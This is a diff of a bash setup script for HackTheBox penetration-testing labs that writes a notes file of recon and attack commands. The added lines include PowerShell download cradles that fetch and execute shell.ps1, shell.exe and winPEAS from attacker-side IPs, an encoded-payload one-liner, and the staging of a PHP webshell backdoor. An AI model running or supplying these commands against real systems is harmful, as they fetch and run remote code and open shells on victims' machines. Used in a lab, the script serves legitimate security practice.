@@ -1,10 +1,11 @@
 #!/bin/bash
+# to run type '. /directory/setup'
 # set box name, IP and ostype
-BOXNAME=Intelligence
-LAST=248
+BOXNAME=Anubis
+LAST=102
 OS=win
 
-export IP=10.10.10.$LAST                           #enter box IP
+export IP=10.10.11.$LAST                           #enter box IP
 export SELF=`hostname -I | awk '{print $2}'`
 export HOME=/home/kali/hackthebox/$BOXNAME          #enter box Name
 export SELF=$(hostname -I | awk '{print$2}')
@@ -34,9 +35,17 @@ else
 fi
 
 echo '#export IP='$IP > $HOME/notes
-echo '#nmap -sC -sV -vv -oN $HOME/nmap/Initial $IP' >> $HOME/notes
+echo '#masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0' >> $HOME/notes
+echo '#nmap -sC -sV -p- -vvv -oN $HOME/nmap/Initial $IP' >> $HOME/notes
 echo '#gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -s 200 -x php,html,txt,xml,sh,py -o buster/80dir.log' >> $HOME/notes
+echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o buster/root.log' >> $HOME/notes
+echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o buster/root_files.log' >> $HOME/notes
+echo '#gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o buster/vhosts.log' >> $HOME/notes
 echo '#gobuster dns domain.com -o buster/dom.log' >> $HOME/notes
+echo '#echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8080/shell.ps1')" | iconv --to-code UTF16LE | base64 -w0' >> $HOME/notes
+echo '#powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.155/winPEAS.bat', 'C:\temp\winPEAS.bat')"' >> $HOME/notes
+echo '#IWR http://10.10.10.10/shell.exe -OutFile shell.exe' >> $HOME/notes
+echo '#cp /usr/share/webshells/php/simple-backdoor.php .' >> $HOME/notes
 echo "#nikto -h $IP"
 echo "add machine name domain.htb to /etc/hosts (search to ensure named correct)"
 echo "#nikto -h domain.htb"
@@ -45,7 +54,7 @@ echo "any problems kill VBoxClient clipboard etc."
 # Build obsidian files for not keeping
 # Cover page
 echo '<p align="center">' >> $HOME/$BOXNAME/000\ -\ Cover.md
-echo '  <img  width=512 src="" />' >> $HOME/$BOXNAME/000\ -\ Cover.md
+echo '  <img  width=1024 src="" />' >> $HOME/$BOXNAME/000\ -\ Cover.md
 echo '</p>' >> $HOME/$BOXNAME/000\ -\ Cover.md
 # loot page
 echo '# Creds' >> $HOME/$BOXNAME/00\ -\ Loot.md
